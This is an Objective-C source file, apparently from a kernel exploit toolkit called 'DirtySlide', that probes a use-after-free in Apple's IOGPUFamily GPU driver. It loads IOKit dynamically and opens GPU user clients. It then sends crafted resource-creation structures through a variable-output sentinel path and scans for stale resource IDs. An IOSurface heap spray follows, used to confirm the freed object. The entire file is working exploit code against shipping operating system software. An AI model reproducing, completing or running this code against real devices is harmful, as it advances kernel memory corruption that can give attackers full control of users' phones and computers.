//  probe_iogpu_uaf.m - DirtySlide ROW L: IOGPUFamily UAF 64788 (v180)
//  23G71 Ghidra + macOS 26.6 KDK (25G72) symbolicated layout (arm64e):
//    IOGPUNewResourceArgs (0x58):
//      +0x00 u32 type        (0x82 = SysMemShared(IOSurface))
//      +0x04 u32 cacheMode   (gate: ror(w,8) < 10)
//      +0x15 u8  flags       (bit3 suballoc, bit6 map)
//      +0x20/+0x28 u64 size pair
//      +0x30 u32 count       +0x34 u32
//      +0x38 u32 iosurfaceID +0x3c u32 plane +0x40 u32 opt5
//      +0x48 u64 allocSize   +0x50 u32 suballoc parent
//    sel 9  = s_new_resource (StIn VARIABLE)
//    sel 12 = s_set_resource_purgeable (2 scalars in, 1 out)
//    trap 3 = t_set_resource_purgeable(id, state)
//  v180: GU0 service discovery probes ALL GPU services to find the
//  correct IOGPUDeviceUserClient where sel9 != 0xe00002c2.

#import "ds_core.h"
#import <objc/runtime.h>
#import <CoreFoundation/CoreFoundation.h>
#include <dlfcn.h>
#include <mach/mach.h>
#include <string.h>
#include <strings.h>

/* ---- Manual IOKit type declarations (IOKitLib.h unavailable on iOS SDK) ---- */
typedef mach_port_t io_object_t;
typedef io_object_t io_service_t;
typedef io_object_t io_connect_t;
typedef io_object_t io_iterator_t;

/* ---- Dynamic IOKit function pointers ---- */
typedef mach_port_t (*IOServiceGetMatchingServiceFn)(mach_port_t, CFDictionaryRef);
typedef kern_return_t (*IOServiceOpenFn)(io_service_t, task_port_t, uint32_t, io_connect_t *);
typedef kern_return_t (*IOServiceCloseFn)(io_connect_t);
typedef kern_return_t (*IOObjectReleaseFn)(io_object_t);
typedef CFStringRef (*IOObjectCopyClassFn)(io_object_t);
typedef kern_return_t (*IOServiceGetMatchingServicesFn)(mach_port_t, CFDictionaryRef, io_iterator_t *);
typedef io_service_t (*IOIteratorNextFn)(io_iterator_t);
typedef CFMutableDictionaryRef (*IOServiceMatchingFn)(const char *);

typedef mach_port_t ds_uaf_ioconn_t;

static kern_return_t (*pTrap2)(ds_uaf_ioconn_t, uint32_t, uintptr_t, uintptr_t);
static kern_return_t (*pStructCall)(ds_uaf_ioconn_t, uint32_t, const void *, size_t, void *, size_t *);
static kern_return_t (*pCallMethod)(ds_uaf_ioconn_t, uint32_t, const uint64_t *, uint32_t, const void *, size_t, uint64_t *, uint32_t *, void *, size_t *);
static kern_return_t (*pMethod64)(ds_uaf_ioconn_t, uint32_t, uint64_t *, uint32_t, uint64_t *, uint32_t *, void *, size_t, void *, size_t *);
static kern_return_t (*pScalarCall)(ds_uaf_ioconn_t, uint32_t, const uint64_t *, uint32_t, uint64_t *, uint32_t *);

static IOServiceGetMatchingServiceFn pGetService;
static IOServiceOpenFn pOpen;
static IOServiceCloseFn pClose;
static IOObjectReleaseFn pRelease;
static IOObjectCopyClassFn pCopyClass;
static IOServiceGetMatchingServicesFn pGetAllServices;
static IOIteratorNextFn pIterNext;
static IOServiceMatchingFn pMatch;

static int ds_uaf_load_iokit(void)
{
    void *k = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!k) {
        dprintf(STDOUT_FILENO, "  [DBG] dlopen IOKit failed\n");
        return -1;
    }
    
    /* Core symbols (MUST exist) */
    pTrap2      = (void *)dlsym(k, "IOConnectTrap2");
    pStructCall = (void *)dlsym(k, "IOConnectCallStructMethod");
    pScalarCall = (void *)dlsym(k, "IOConnectCallScalarMethod");
    pGetService = (void *)dlsym(k, "IOServiceGetMatchingService");
    pOpen       = (void *)dlsym(k, "IOServiceOpen");
    pClose      = (void *)dlsym(k, "IOServiceClose");
    pRelease    = (void *)dlsym(k, "IOObjectRelease");
    pMatch      = (void *)dlsym(k, "IOServiceMatching");
    pCallMethod = (void *)dlsym(k, "IOConnectCallMethod");
    pMethod64   = (void *)dlsym(k, "io_connect_method64");
    if (!pMethod64) pMethod64 = (void *)dlsym(k, "_io_connect_method64");
    dprintf(STDOUT_FILENO, "  [DBG] method64=%p callMethod=%p\n", (void *)pMethod64, (void *)pCallMethod);

    /* Optional symbols (may not exist on iOS) */
    pCopyClass      = (void *)dlsym(k, "IOObjectCopyClass");
    pGetAllServices = (void *)dlsym(k, "IOServiceGetMatchingServices");
    pIterNext       = (void *)dlsym(k, "IOIteratorNext");
    
    /* Debug: log which symbols failed */
    if (!pTrap2)      dprintf(STDOUT_FILENO, "  [DBG] MISSING: IOConnectTrap2\n");
    if (!pStructCall) dprintf(STDOUT_FILENO, "  [DBG] MISSING: IOConnectCallStructMethod\n");
    if (!pScalarCall) dprintf(STDOUT_FILENO, "  [DBG] MISSING: IOConnectCallScalarMethod\n");
    if (!pGetService) dprintf(STDOUT_FILENO, "  [DBG] MISSING: IOServiceGetMatchingService\n");
    if (!pOpen)       dprintf(STDOUT_FILENO, "  [DBG] MISSING: IOServiceOpen\n");
    if (!pClose)      dprintf(STDOUT_FILENO, "  [DBG] MISSING: IOServiceClose\n");
    if (!pRelease)    dprintf(STDOUT_FILENO, "  [DBG] MISSING: IOObjectRelease\n");
    if (!pMatch)      dprintf(STDOUT_FILENO, "  [DBG] MISSING: IOServiceMatching\n");
    if (!pCopyClass)      dprintf(STDOUT_FILENO, "  [DBG] OPTIONAL missing: IOObjectCopyClass\n");
    if (!pGetAllServices) dprintf(STDOUT_FILENO, "  [DBG] OPTIONAL missing: IOServiceGetMatchingServices\n");
    if (!pIterNext)       dprintf(STDOUT_FILENO, "  [DBG] OPTIONAL missing: IOIteratorNext\n");
    
    /* Only require core symbols */
    if (!pTrap2 || !pStructCall || !pScalarCall || !pGetService ||
        !pOpen || !pClose || !pRelease || !pMatch) {
        return -1;
    }
    return 0;
}

/* ---- Guarded wrappers ---- */
static kern_return_t ds_uaf_struct(ds_uaf_ioconn_t c, uint32_t sel, const void *in, size_t inSz, void *out, size_t *outSz)
{
    static uint8_t inbuf[0x100];
    static uint8_t outbuf[0x10000];
    if (in && in != inbuf) memcpy(inbuf, in, inSz < 0x100 ? inSz : 0x100);
    size_t osz = outSz ? *outSz : 0x1000;
    if (osz > 0x10000) osz = 0x10000;

    __block kern_return_t kr = KERN_FAILURE;
    __block int rc = 0;

    if (pCallMethod) {
        /* explicit-parameter path (v181): full control of out struct size */
        __block uint32_t outCnt = 0;
        __block size_t outStructCnt = osz;
        const void *ip = inbuf;
        void *op = outbuf;
        int sig = ds_ave_guard_run_tmo(^int {
            kr = pCallMethod(c, sel, NULL, 0, ip, inSz, NULL, &outCnt, op, &outStructCnt);
            return 0;
        }, &rc, 3000);
        dprintf(STDOUT_FILENO, "  [DBG] callMethod sel=%u inSz=%zu outReq=%zu outGot=%zu kr=%#x\n",
                sel, inSz, osz, outStructCnt, kr);
        if (out && outSz) {
            size_t c = outStructCnt < *outSz ? outStructCnt : *outSz;
            if (outStructCnt <= 0x10000) memcpy(out, outbuf, c);
            *outSz = outStructCnt;
        }
        return sig ? ((kern_return_t)0xffffff00 | sig) : kr;
    } else {
        const void *ip = inbuf;
        void *op = outbuf;
        size_t *osp = &osz;
        size_t isz = inSz;
        int sig = ds_ave_guard_run_tmo(^int {
            kr = pStructCall(c, sel, ip, isz, op, osp);
            return 0;
        }, &rc, 3000);
        dprintf(STDOUT_FILENO, "  [DBG] structMethod sel=%u inSz=%zu outSz=%zu kr=%#x\n", sel, isz, osz, kr);
        if (out && outSz) {
            size_t c2 = osz < *outSz ? osz : *outSz;
            memcpy(out, outbuf, c2);
            *outSz = osz;
        }
        return sig ? ((kern_return_t)0xffffff00 | sig) : kr;
    }
}
static kern_return_t ds_uaf_scalar(ds_uaf_ioconn_t c, uint32_t sel, uint64_t a, uint64_t b, uint64_t *o1)
{
    __block kern_return_t kr = KERN_FAILURE;
    __block int rc = 0;
    static uint64_t in2[2];
    in2[0] = a; in2[1] = b;
    const uint64_t *inp = in2;
    __block uint32_t n = 1;
    int sig = ds_ave_guard_run_tmo(^int { kr = pScalarCall(c, sel, inp, 2, o1, &n); return 0; }, &rc, 3000);
    return sig ? ((kern_return_t)0xffffff00 | sig) : kr;
}

static kern_return_t ds_uaf_trap(ds_uaf_ioconn_t c, uint32_t id, uint32_t state)
{
    __block kern_return_t kr = KERN_FAILURE;
    __block int rc = 0;
    int sig = ds_ave_guard_run_tmo(^int { kr = pTrap2(c, 3, id, state); return 0; }, &rc, 3000);
    return sig ? ((kern_return_t)0xffffff00 | sig) : kr;
}

/* v184: THE VARIABLE-OUTPUT SENTINEL - *outputStructCnt = (size_t)-3 makes
 * IOKit.fw take io_connect_method_var_output = the kernel builds the output
 * DESCRIPTOR (EMA+0x58/0x60 populated) and REPLACES our output pointer with
 * a kernel-allocated return buffer. This is how Metal reaches new_resource. */
static kern_return_t ds_uaf_create_varout(ds_uaf_ioconn_t c, const void *args, size_t argsSz, uint8_t **outBuf, size_t *outSz)
{
    __block kern_return_t kr = KERN_FAILURE;
    __block int rc = 0;
    __block void *outPtr = (void *)0x10;          /* dummy - kernel replaces it */
    __block size_t outCntSentinel = (size_t)-3;   /* THE SENTINEL */
    const void *ap = args;
    size_t asz = argsSz;
    int sig = ds_ave_guard_run_tmo(^int {
        if (pCallMethod)
            kr = pCallMethod(c, 9, NULL, 0, ap, asz, NULL, (uint32_t *)&outCntSentinel, &outPtr, &outCntSentinel);
        else
            kr = pStructCall(c, 9, ap, asz, outPtr, &outCntSentinel);
        return 0;
    }, &rc, 5000);
    *outBuf = (uint8_t *)outPtr;
    *outSz = outCntSentinel;
    dprintf(STDOUT_FILENO, "  [DBG] varout kr=%#x buf=%p size=%zu\n", kr, (void *)outPtr, outCntSentinel);
    return sig ? ((kern_return_t)0xffffff00 | sig) : kr;
}

/* v183: OOL-forcing create wrappers */
static kern_return_t ds_uaf_struct_ool(ds_uaf_ioconn_t c, uint32_t sel, const void *in, size_t realInSz, void *out, size_t *outSz)
{
    static uint8_t big[0x4000];
    memset(big, 0, sizeof(big));
    if (in) memcpy(big, in, realInSz < sizeof(big) ? realInSz : sizeof(big));
    __block kern_return_t kr = KERN_FAILURE;
    __block int rc = 0;
    __block size_t osz = outSz ? *outSz : 0x1000;
    int sig = ds_ave_guard_run_tmo(^int {
        kr = pStructCall(c, sel, big, sizeof(big), out, &osz);
        return 0;
    }, &rc, 3000);
    if (out && outSz) *outSz = osz;
    dprintf(STDOUT_FILENO, "  [DBG] ool-pad sel=%u kr=%#x out=%zu\n", sel, kr, osz);
    return sig ? ((kern_return_t)0xffffff00 | sig) : kr;
}
static kern_return_t ds_uaf_create64(ds_uaf_ioconn_t c, const void *args, size_t argsSz, void *out, size_t *outSz)
{
    __block kern_return_t kr = KERN_FAILURE;
    __block int rc = 0;
    __block size_t osz = outSz ? *outSz : 0x1000;
    if (pMethod64) {
        static uint64_t noScal[1];
        noScal[0] = 0;
        const uint64_t *nsp = noScal;
        __block uint32_t outCnt = 0;
        const void *ap = args; void *op = out;
        size_t asz = argsSz;
        int sig = ds_ave_guard_run_tmo(^int {
            kr = pMethod64(c, 9, nsp, 0, NULL, &outCnt, (void *)ap, asz, op, &osz);
            return 0;
        }, &rc, 3000);
        dprintf(STDOUT_FILENO, "  [DBG] method64 kr=%#x outSz=%zu\n", kr, osz);
    } else {
        kr = ds_uaf_struct_ool(c, 9, args, argsSz, out, &osz);
        dprintf(STDOUT_FILENO, "  [DBG] ool-fallback kr=%#x outSz=%zu\n", kr, osz);
    }
    if (out && outSz) *outSz = osz;
    return kr;
}

/* ---- IOGPUNewResourceArgs builder ---- */
static void ds_uaf_build_args(uint8_t *inb, uint32_t type, uint32_t sid, uint32_t plane)
{
    memset(inb, 0, 0x58);
    *(uint32_t *)(inb + 0x00) = type;
    *(uint32_t *)(inb + 0x04) = 0;
    *(uint64_t *)(inb + 0x20) = 0;
    *(uint64_t *)(inb + 0x28) = 0;
    *(uint32_t *)(inb + 0x30) = 1;
    *(uint32_t *)(inb + 0x34) = 0;
    *(uint32_t *)(inb + 0x38) = sid;
    *(uint32_t *)(inb + 0x3c) = plane;
    *(uint32_t *)(inb + 0x40) = 0;
    *(uint64_t *)(inb + 0x48) = 0;
}

static IOSurfaceRef ds_uaf_make_surface(uint32_t w, uint32_t h, uint32_t *idOut)
{
    NSDictionary *props = @{
        (id)kIOSurfaceWidth:           @(w),
        (id)kIOSurfaceHeight:          @(h),
        (id)kIOSurfaceBytesPerElement: @(4),
        (id)kIOSurfacePixelFormat:     @(0x42475241),
    };
    IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)props);
    if (s && idOut) *idOut = (uint32_t)IOSurfaceGetID(s);
    return s;
}

void probe_iogpu_uaf(const char *pfx)
{
    dprintf(STDOUT_FILENO, "%s== L. IOGPU-UAF 64788 (v184 - var-output sentinel (the Metal path)) ==\n", pfx);
    dprintf(STDOUT_FILENO, "%s  args: type@0 cacheMode@4 flags@15 sizes@20/28 cnt@30\n", pfx);
    dprintf(STDOUT_FILENO, "%s  sid@38 plane@3c opt@40 alloc@48; sel9 create, sel12+trap3 oracle.\n", pfx);

    if (ds_uaf_load_iokit() != 0) {
        dprintf(STDOUT_FILENO, "%s  I[GU] IOKit load failed\n", pfx);
        return;
    }

    /* ==== GU0: SERVICE DISCOVERY (null-safe) ==== */
    ds_journal_write("START", "GU0 conn-discovery");
    ds_uaf_ioconn_t gpuConn = MACH_PORT_NULL;
    ds_uaf_ioconn_t fallbackConn = MACH_PORT_NULL;
    const char *fallbackName = NULL;
    uint32_t fallbackType = 0;
    {
        const char *candidates[] = {
            "IOGPUDevice", "AGXSharedUserClient", "AGXCommandQueue",
            "AGXAccelerator", "IOGPUAccelerator", "AGXDevice",
            "AppleParavirtGPU", NULL
        };
        for (int ci = 0; candidates[ci] && gpuConn == MACH_PORT_NULL; ci++) {
            CFMutableDictionaryRef dict = pMatch(candidates[ci]);
            if (!dict) continue;
            io_service_t svc = pGetService(0, dict);
            if (!svc) continue;

            for (uint32_t t = 0; t <= 1 && gpuConn == MACH_PORT_NULL; t++) {
                ds_uaf_ioconn_t testConn = MACH_PORT_NULL;
                kern_return_t kr = pOpen(svc, mach_task_self(), t, &testConn);
                if (kr != KERN_SUCCESS || testConn == MACH_PORT_NULL) continue;

                /* conformance test: real new_resource discriminates valid vs deadbeef sid */
                uint32_t sidT = 0;
                IOSurfaceRef sT = ds_uaf_make_surface(64, 64, &sidT);
                kern_return_t kv = 0, kd = 0;
                if (sT) {
                    uint8_t ti[0x58]; uint8_t to[0x1000]; size_t tos = sizeof(to);
                    ds_uaf_build_args(ti, 0x82, sidT, 0);
                    kv = pStructCall(testConn, 9, ti, 0x58, to, &tos);
                    ds_uaf_build_args(ti, 0x82, 0xdeadbeef, 0);
                    tos = sizeof(to);
                    kd = pStructCall(testConn, 9, ti, 0x58, to, &tos);
                    CFRelease(sT);
                } else {
                    uint8_t ti[0x58]; uint8_t to[0x1000]; size_t tos = sizeof(to);
                    memset(ti, 0, sizeof(ti)); *(uint32_t *)ti = 0x82;
                    kv = pStructCall(testConn, 9, ti, 0x58, to, &tos);
                    kd = kv;
                }
                dprintf(STDOUT_FILENO, "%s  I[GU0] %s type=%u sel9 valid=%#x dead=%#x %s\n",
                        pfx, candidates[ci], t, kv, kd,
                        kv != kd ? "<-- REAL new_resource" : "");

                if (kv != kd) {
                    gpuConn = testConn;
                    dprintf(STDOUT_FILENO, "%s  I[GU0] SELECTED: %s type=%u\n", pfx, candidates[ci], t);
                } else {
                    if (!strcasecmp(candidates[ci], "AGXAccelerator") && t == 1 && fallbackConn == MACH_PORT_NULL) {
                        fallbackConn = testConn;
                        fallbackName = candidates[ci];
                        fallbackType = t;
                    } else {
                        pClose(testConn);
                    }
                }
            }
            pRelease(svc);
        }

        /* Phase 2: Enumerate ALL GPU services (only if symbols available) */
        if (gpuConn == MACH_PORT_NULL && pGetAllServices && pIterNext) {
            dprintf(STDOUT_FILENO, "%s  I[GU0] no candidate matched, enumerating...\n", pfx);
            /* v179.1: IOServiceMatching(NULL) crashes (MakeOneStringProp/strlen(NULL));
               enumerate extra known names instead */
            const char *extra[] = { "IOGPUDevice", "AGXAccelerator", "AGXDevice", "AppleParavirtGPU", NULL };
            CFMutableDictionaryRef allDict = NULL;
            const char *usedName = NULL;
            for (int ei = 0; extra[ei] && !allDict; ei++) {
                allDict = pMatch(extra[ei]);
                if (allDict) usedName = extra[ei];
            }
            if (allDict) {
                dprintf(STDOUT_FILENO, "%s  I[GU0] enumerating %s\n", pfx, usedName);
                io_iterator_t iter = MACH_PORT_NULL;
                kern_return_t gkr = pGetAllServices(0, allDict, &iter);
                if (gkr == KERN_SUCCESS && iter != MACH_PORT_NULL) {
                    io_service_t svc;
                    while ((svc = pIterNext(iter)) != MACH_PORT_NULL && gpuConn == MACH_PORT_NULL) {
                        char clsBuf[128] = "";
                        if (pCopyClass) {
                            CFStringRef cls = pCopyClass(svc);
                            if (cls) {
                                CFStringGetCString(cls, clsBuf, sizeof(clsBuf), kCFStringEncodingUTF8);
                                CFRelease(cls);
                            }
                        }
                        
                        if (clsBuf[0] == '\0' ||
                            (!strcasestr(clsBuf, "GPU") && !strcasestr(clsBuf, "AGX"))) {
                            pRelease(svc);
                            continue;
                        }
                        
                        for (uint32_t t = 0; t <= 1 && gpuConn == MACH_PORT_NULL; t++) {
                            ds_uaf_ioconn_t tc = MACH_PORT_NULL;
                            if (pOpen(svc, mach_task_self(), t, &tc) != KERN_SUCCESS || tc == MACH_PORT_NULL)
                                continue;
                            
                            uint32_t sidT2 = 0;
                            IOSurfaceRef sT2 = ds_uaf_make_surface(64, 64, &sidT2);
                            kern_return_t skv = 0, skd = 0;
                            if (sT2) {
                                uint8_t ti[0x58]; uint8_t to[0x1000]; size_t tos = sizeof(to);
                                ds_uaf_build_args(ti, 0x82, sidT2, 0);
                                skv = pStructCall(tc, 9, ti, 0x58, to, &tos);
                                ds_uaf_build_args(ti, 0x82, 0xdeadbeef, 0);
                                tos = sizeof(to);
                                skd = pStructCall(tc, 9, ti, 0x58, to, &tos);
                                CFRelease(sT2);
                            }
                            dprintf(STDOUT_FILENO, "%s  I[GU0] enum %s type=%u valid=%#x dead=%#x\n",
                                    pfx, clsBuf, t, skv, skd);
                            
                            if (skv != skd && skv != 0 && skd != 0) {
                                gpuConn = tc;
                                dprintf(STDOUT_FILENO, "%s  I[GU0] SELECTED (enum): %s type=%u\n", pfx, clsBuf, t);
                            } else {
                                pClose(tc);
                            }
                        }
                        pRelease(svc);
                    }
                    pRelease(iter);
                }
            }
        } else if (gpuConn == MACH_PORT_NULL) {
            dprintf(STDOUT_FILENO, "%s  I[GU0] enumeration symbols unavailable, candidates only\n", pfx);
        }
    }
    ds_journal_write("DONE", "GU0 conn-discovery");

    if (gpuConn == MACH_PORT_NULL && fallbackConn != MACH_PORT_NULL) {
        gpuConn = fallbackConn;
        dprintf(STDOUT_FILENO, "%s  I[GU0] FALLBACK: %s type=%u (uniform 2c2 = dispatcher lives here,\n", pfx, fallbackName, fallbackType);
        dprintf(STDOUT_FILENO, "%s  v178-proven; the gate isolation in GU2 decides)\n", pfx);
    }
    if (gpuConn == MACH_PORT_NULL) {
        dprintf(STDOUT_FILENO, "%s  I[GU0] FAILED: no userclient opened\n", pfx);
        dprintf(STDOUT_FILENO, "%s  sweep done - .ips captureTime <-> [stamp]\n", pfx);
        return;
    }

    /* ==== GU1: baseline (trap3 + sel12) ==== */
    ds_journal_write("START", "GU1 baseline");
    {
        for (uint32_t id = 1; id <= 8; id++) {
            kern_return_t k1 = ds_uaf_trap(gpuConn, id, 1);
            uint64_t o = 0;
            kern_return_t k2 = ds_uaf_scalar(gpuConn, 12, id, 1, &o);
            dprintf(STDOUT_FILENO, "%s  I[GU1] id=%u trap3=%#x sel12=%#x out=%llu\n",
                    pfx, id, k1, k2, (unsigned long long)o);
        }
    }
    ds_journal_write("DONE", "GU1 baseline");

    /* ==== GU2: direct create via sel 9 (0x82) - gate isolation ==== */
    ds_journal_write("START", "GU2 create");
    uint32_t staleId = 0;
    {
        static uint8_t obuf[0x1000];
        size_t oSz = sizeof(obuf);
        uint32_t sidC = 0;
        IOSurfaceRef sC = ds_uaf_make_surface(64, 64, &sidC);
        uint8_t inb[0x58];

        /* G0: control with big out buffer */
        if (sC) {
            ds_uaf_build_args(inb, 0x82, sidC, 0);
            kern_return_t kr = ds_uaf_struct(gpuConn, 9, inb, 0x58, obuf, &oSz);
            dprintf(STDOUT_FILENO, "%s  I[GU2] G0 64x64 sid=%#x bigOut -> kr=%#x out=%zu\n",
                    pfx, sidC, kr, oSz);
        }

        /* G-VAROUT: the sentinel path - THE mechanism Metal uses */
        if (sC) {
            uint8_t varArgs[0x58];
            ds_uaf_build_args(varArgs, 0x82, sidC, 0);
            uint8_t *vBuf = NULL; size_t vSz = 0;
            kern_return_t krV = ds_uaf_create_varout(gpuConn, varArgs, 0x58, &vBuf, &vSz);
            dprintf(STDOUT_FILENO, "%s  I[GU2] G-VAROUT 64x64 sid=%#x -> kr=%#x buf=%p size=%zu %s\n",
                    pfx, sidC, krV, (void *)vBuf, vSz,
                    krV != 0xe00002c2 ? "<-- THE GATE MOVED" : "(sentinel did not change the gate)");
            if (vBuf && vBuf > (uint8_t *)0x1000 && vSz && vSz < 0x100000) {
                uint8_t dump[64];
                size_t dn = vSz < 64 ? vSz : 64;
                memcpy(dump, vBuf, dn);
                dprintf(STDOUT_FILENO, "%s  I[GU2] ret[0..%zu]:", pfx, dn);
                for (size_t di = 0; di < dn; di += 8)
                    dprintf(STDOUT_FILENO, " %016llx", (unsigned long long)*(uint64_t *)(dump + di));
                dprintf(STDOUT_FILENO, "\n");
            }
            if (krV != 0xe00002c2) {
                for (uint32_t id = 1; id <= 64; id++) {
                    kern_return_t k1 = ds_uaf_trap(gpuConn, id, 1);
                    if (k1 != 0xe00002c2) { dprintf(STDOUT_FILENO, "%s  I[GU2] STALE ENTRY id=%u kr=%#x\n", pfx, id, k1); staleId = id; break; }
                }
            }
        }

        /* G-OOL: force the OOL/method64 path with a padded 16KB input */
        if (sC) {
            uint8_t bigArgs[0x4000];
            memset(bigArgs, 0, sizeof(bigArgs));
            *(uint32_t *)(bigArgs + 0x00) = 0x82;
            *(uint32_t *)(bigArgs + 0x30) = 1;
            *(uint32_t *)(bigArgs + 0x38) = sidC;
            *(uint32_t *)(bigArgs + 0x3c) = 0;
            uint8_t bigOut[0x1000];
            size_t bigOutSz = sizeof(bigOut);
            kern_return_t krBig = ds_uaf_create64(gpuConn, bigArgs, sizeof(bigArgs), bigOut, &bigOutSz);
            dprintf(STDOUT_FILENO, "%s  I[GU2] G-OOL inSz=0x%zx -> kr=%#x out=%zu %s\n",
                    pfx, sizeof(bigArgs), krBig, bigOutSz,
                    krBig != 0xe00002c2 ? "<-- OOL PATH CHANGED THE ANSWER" : "(still uniform)");
        }

        /* G1: OUT-SIZE sweep - the budget reads EMA.structureOutputDescriptorSize */
        {
            uint32_t sidP = 0;
            IOSurfaceRef sP = ds_uaf_make_surface(1, 0xFFFF, &sidP);
            dprintf(STDOUT_FILENO, "%s  I[GU2] plant surface 1x65535 id=%#x\n", pfx, sidP);
            static const size_t oszs[] = { 0x1000, 0x2000, 0x4000, 0x10000 };
            for (size_t i = 0; i < 4; i++) {
                uint8_t inb[0x58];
                ds_uaf_build_args(inb, 0x82, sidP, 0);
                uint8_t bigOut[0x10000];
                size_t oSz = oszs[i];
                kern_return_t kr = ds_uaf_struct(gpuConn, 9, inb, 0x58, bigOut, &oSz);
                dprintf(STDOUT_FILENO, "%s  I[GU2] G1 outSz=%#zx -> kr=%#x out=%zu\n", pfx, oszs[i], kr, oSz);
            }
            /* G2: IN-SIZE sweep (handler cmp x3,#0x58; larger may alter EMA packing) */
            static const size_t iszs[] = { 0x58, 0x60, 0x80, 0x100 };
            for (size_t i = 0; i < 4; i++) {
                uint8_t inb[0x100];
                memset(inb, 0, sizeof(inb));
                ds_uaf_build_args(inb, 0x82, sidP, 0);
                uint8_t bigOut[0x10000];
                size_t oSz = 0x4000;
                kern_return_t kr = ds_uaf_struct(gpuConn, 9, inb, iszs[i], bigOut, &oSz);
                dprintf(STDOUT_FILENO, "%s  I[GU2] G2 inSz=%#zx -> kr=%#x out=%zu\n", pfx, iszs[i], kr, oSz);
            }
            /* G3: THE PLANT with the best-known shape + stale sweep */
            for (int v = 0; v < 4 && staleId == 0; v++) {
                uint8_t inb[0x58];
                ds_uaf_build_args(inb, 0x82, sidP, (v & 1) ? 1 : 0);
                if (v >= 2) *(uint32_t *)(inb + 0x40) = 1;
                uint8_t *vBuf = NULL; size_t vSz = 0;
                kern_return_t kr = ds_uaf_create_varout(gpuConn, inb, 0x58, &vBuf, &vSz);
                dprintf(STDOUT_FILENO, "%s  I[GU2] G3 plant v%d kr=%#x buf=%p size=%zu\n", pfx, v, kr, (void *)vBuf, vSz);
                for (uint32_t id = 1; id <= 64; id++) {
                    kern_return_t k1 = ds_uaf_trap(gpuConn, id, 1);
                    if (k1 != 0xe00002c2) {
                        dprintf(STDOUT_FILENO, "%s  I[GU2] STALE ENTRY id=%u trap3=%#x\n", pfx, id, k1);
                        staleId = id;
                        break;
                    }
                }
            }
            if (sP) CFRelease(sP);
        }
        if (sC) CFRelease(sC);
    }
    ds_journal_write("DONE", "GU2 create");

    /* ==== GU3: broad stale sweep ==== */
    ds_journal_write("START", "GU3 sweep");
    {
        for (uint32_t id = 1; id <= 128 && staleId == 0; id++) {
            kern_return_t k1 = ds_uaf_trap(gpuConn, id, 1);
            uint64_t o = 0;
            kern_return_t k2 = ds_uaf_scalar(gpuConn, 12, id, 1, &o);
            if (k1 != 0xe00002c2 || k2 != 0xe00002c2) {
                dprintf(STDOUT_FILENO, "%s  I[GU3] id=%u trap3=%#x sel12=%#x = NON-BASELINE\n",
                        pfx, id, k1, k2);
                staleId = id;
            }
        }
        if (!staleId)
            dprintf(STDOUT_FILENO, "%s  I[GU3] no stale id (all 2c2)\n", pfx);
    }
    ds_journal_write("DONE", "GU3 sweep");

    /* ==== GU4: IOSurface-churn spray + dual-oracle confirm ==== */
    ds_journal_write("START", "GU4 spray");
    {
        NSMutableArray *spray = [NSMutableArray arrayWithCapacity:0x200];
        for (int i = 0; i < 0x200; i++) {
            IOSurfaceRef s2 = ds_uaf_make_surface(64, 64, NULL);
            if (s2) [spray addObject:(__bridge id)s2];
        }
        dprintf(STDOUT_FILENO, "%s  I[GU4] %u live 64x64 surfaces\n", pfx, (unsigned)spray.count);
        if (staleId) {
            kern_return_t k1 = ds_uaf_trap(gpuConn, staleId, 1);
            uint64_t o = 0;
            kern_return_t k2 = ds_uaf_scalar(gpuConn, 12, staleId, 1, &o);
            dprintf(STDOUT_FILENO, "%s  I[GU4] confirm id=%u trap3=%#x sel12=%#x out=%llu %s\n",
                    pfx, staleId, k1, k2, (unsigned long long)o,
                    (k1 == 0xe00002be || k2 == 0xe00002be) ? "= THE 64788 RECEIPT" : "");
        }
    }
    ds_journal_write("DONE", "GU4 spray");

    /* ==== GU5: 3x repeat (plant + sweep) ==== */
    ds_journal_write("START", "GU5 stability");
    {
        for (int round = 1; round <= 3; round++) {
            uint32_t sid = 0;
            IOSurfaceRef s3 = ds_uaf_make_surface(1, 0xFFFF, &sid);
            if (s3) {
                uint8_t inb[0x58];
                uint8_t obuf2[0x100];
                size_t oSz = sizeof(obuf2);
                ds_uaf_build_args(inb, 0x82, sid, 0);
                kern_return_t kr = ds_uaf_struct(gpuConn, 9, inb, 0x58, obuf2, &oSz);
                uint32_t hits = 0;
                for (uint32_t id = 1; id <= 64; id++) {
                    kern_return_t k1 = ds_uaf_trap(gpuConn, id, 1);
                    if (k1 != 0xe00002c2) hits++;
                }
                dprintf(STDOUT_FILENO, "%s  I[GU5] round %d: create kr=%#x, %u non-baseline ids\n",
                        pfx, round, kr, hits);
                CFRelease(s3);
            }
        }
    }
    ds_journal_write("DONE", "GU5 stability");

    /* Heartbeat */
    for (int b = 1; b <= 2; b++) {
        char htag[16];
        snprintf(htag, sizeof(htag), "GUB%02d beat", b);
        ds_ave_replay(pfx, htag, 1, 1, 64, kCMVideoCodecType_H264, kCVPixelFormatType_32BGRA, 1, 1);
        usleep(300000);
    }

    dprintf(STDOUT_FILENO, "%s  L read-offs: GU0 = service discovery (finds correct IOGPUDeviceUserClient).\n", pfx);
    dprintf(STDOUT_FILENO, "%s  GU1 = oracle baseline. GU2 = direct 0x82 create with gate isolation.\n", pfx);
    dprintf(STDOUT_FILENO, "%s  GU3 = broad stale sweep. GU4 = spray + dual-oracle confirm.\n", pfx);
    dprintf(STDOUT_FILENO, "%s  GU5 = 3x stability. Kernel log = IOGPU/IOSurface lines on fail.\n", pfx);
    dprintf(STDOUT_FILENO, "%s  sweep done - .ips captureTime <-> [stamp]\n", pfx);
}
